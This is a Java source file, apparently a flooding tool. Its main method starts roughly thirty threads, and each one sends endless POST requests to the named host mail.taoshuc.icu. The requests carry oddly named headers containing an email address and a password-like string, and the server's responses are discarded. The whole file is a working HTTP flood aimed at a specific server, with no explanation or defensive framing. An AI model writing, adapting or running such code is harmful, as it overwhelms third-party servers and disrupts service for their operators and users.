import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class HttpUtils {

    public static void main(String[] args) {
        new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start(); new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();
           new Thread(){
            @Override
            public void run() {
                while (true)
                System.out.println(SMS("", "http://mail.taoshuc.icu/mail/"));
            }
        }.start();

    }

    private static String SMS(String postData, String postUrl) {
        try {
            // 发送POST请求
            URL url = new URL(postUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");//修改发送方式
            conn.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.addRequestProperty("hrUW3PG7mp3RLd3dJu", "7417417417@qq.com");
            conn.addRequestProperty("LxMzAX2jog9Bpjs07jP", "g41741");
            conn.setUseCaches(false);
            conn.setDoOutput(true);

            conn.setRequestProperty("Content-Length", "" + postData.length());
            OutputStreamWriter out = new OutputStreamWriter(
                    conn.getOutputStream(), "UTF-8");
            out.write(postData);
            out.flush();
            out.close();

            // 获取响应状态
            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "";
            }
            // 获取响应内容体
            String line, result = "";
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    conn.getInputStream(), "utf-8"));
            while ((line = in.readLine()) != null) {
                result += line + "\n";
            }
            in.close();
            return "1";
        } catch (IOException e) {
        }
        return "";
    }
}